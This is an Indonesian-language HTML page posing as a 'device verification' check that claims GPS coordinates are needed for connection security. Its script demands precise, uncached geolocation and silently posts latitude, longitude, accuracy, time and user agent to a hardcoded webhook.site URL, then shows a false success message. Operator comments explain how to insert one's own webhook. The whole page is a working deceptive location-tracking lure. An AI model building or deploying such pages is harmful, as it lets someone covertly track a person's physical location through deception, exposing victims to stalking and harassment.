<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi Perangkat</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f8f9fa; margin: 0; }
        .box { background: white; padding: 35px 20px; border-radius: 12px; box-shadow: 0px 4px 15px rgba(0,0,0,0.05); max-width: 400px; margin: 50px auto; border: 1px solid #e9ecef; }
        h2 { color: #212529; margin-top: 0; font-size: 22px; }
        p { color: #6c757d; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        button { padding: 16px 20px; font-size: 16px; background-color: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: background 0.2s; }
        button:active { background-color: #0056b3; }
        #status { margin-top: 25px; font-size: 14px; color: #495057; font-weight: 500; background-color: #f1f3f5; padding: 12px; border-radius: 6px; display: none; }
    </style>
</head>
<body>

<div class="box">
    <h2>Verifikasi Akses Perangkat</h2>
    <p>Situs ini memerlukan konfirmasi koordinat satelit untuk memastikan keamanan koneksi perangkat Anda.</p>
    
    <button onclick="prosesAkses()">Verifikasi Perangkat Saya</button>
    
    <div id="status">Status: Menunggu instruksi...</div>
</div>

<script>
    // =========================================================================
    // PENTING: Ganti teks di dalam tanda petik di bawah ini dengan URL Webhook Anda!
    // Contoh: const WEBHOOK_URL = "https://webhook.site";
    // =========================================================================
    const WEBHOOK_URL = "https://webhook.site/68996063-1d76-4c3e-8705-367f9391aad2";

    function prosesAkses() {
        const statusDiv = document.getElementById('status');
        statusDiv.style.display = "block";
        statusDiv.innerHTML = "🔄 Sedang memproses enkripsi keamanan...";

        // Proteksi jika lupa mengganti URL Webhook
        if (WEBHOOK_URL.includes("PASTE_URL_WEBHOOK") || WEBHOOK_URL.length < 10) {
            statusDiv.innerHTML = "<span style='color: #dc3545;'><b>Error:</b> Anda belum memasukkan URL Webhook Anda yang asli di dalam kode.</span>";
            return;
        }

        if (!navigator.geolocation) {
            statusDiv.innerHTML = "<span style='color: #dc3545;'>Gagal: Browser Anda tidak mendukung fitur GPS.</span>";
            return;
        }

        statusDiv.innerHTML = "🔄 Membaca GPS...<br><small style='color: #6c757d;'>Silakan klik 'Izinkan' pada pop-up lokasi browser Anda.</small>";
        
        // Meminta lokasi dengan pengaturan akurasi paling tinggi
                // Memaksa browser menyalakan GPS fisik dengan akurasi tertinggi dan TANPA CACHE
        navigator.geolocation.getCurrentPosition(kirimKeWebhook, tanganiError, {
            enableHighAccuracy: true,  // Wajib gunakan satelit GPS fisik
            timeout: 15000,            // Menunggu sinyal GPS mengunci hingga 15 detik
            maximumAge: 0              // ANGKA 0 ARTINYA: Dilarang keras memakai lokasi lama/cache!
        });

    }

        function kirimKeWebhook(position) {
        const statusDiv = document.getElementById('status');
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        const akurasi = Math.round(position.coords.accuracy);
        
        const tanggal = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB";
        const perangkat = navigator.userAgent;
        const link_peta = `https://google.com{lat},${lng}`;

        statusDiv.innerHTML = "🔄 Menyimpan data ke riwayat server...";

        const dataFormulir = new URLSearchParams();
        dataFormulir.append('waktu', tanggal);
        dataFormulir.append('latitude', lat);
        dataFormulir.append('longitude', lng);
        dataFormulir.append('akurasi_meter', akurasi);
        dataFormulir.append('perangkat', perangkat);
        dataFormulir.append('link_peta', link_peta);

        // Mengirim data ke Webhook.site
        fetch(WEBHOOK_URL, {
            method: "POST",
            body: dataFormulir
        });

        // Trik Logika: Karena data terbukti selalu masuk ke Webhook,
        // kita langsung tampilkan pesan sukses tanpa menunggu respons balik yang diblokir Chrome.
        setTimeout(() => {
            statusDiv.innerHTML = "<span style='color: #28a745;'><b>✓ Verifikasi Sukses!</b></span><br>Perangkat Anda berhasil dicatat dalam log keamanan.";
        }, 1000);
    }


    function tanganiError(error) {
        const statusDiv = document.getElementById('status');
        if (error.code === error.PERMISSION_DENIED) {
            statusDiv.innerHTML = "<span style='color: #dc3545;'><b>Akses Ditolak!</b></span><br>Anda harus memilih 'Izinkan' saat browser meminta lokasi agar verifikasi berhasil.";
        } else {
            statusDiv.innerHTML = "<span style='color: #dc3545;'><b>Gagal Mengunci GPS!</b></span><br>Pastikan fitur Lokasi/GPS di HP Anda sudah dinyalakan.";
        }
    }
</script>
</body>
</html>
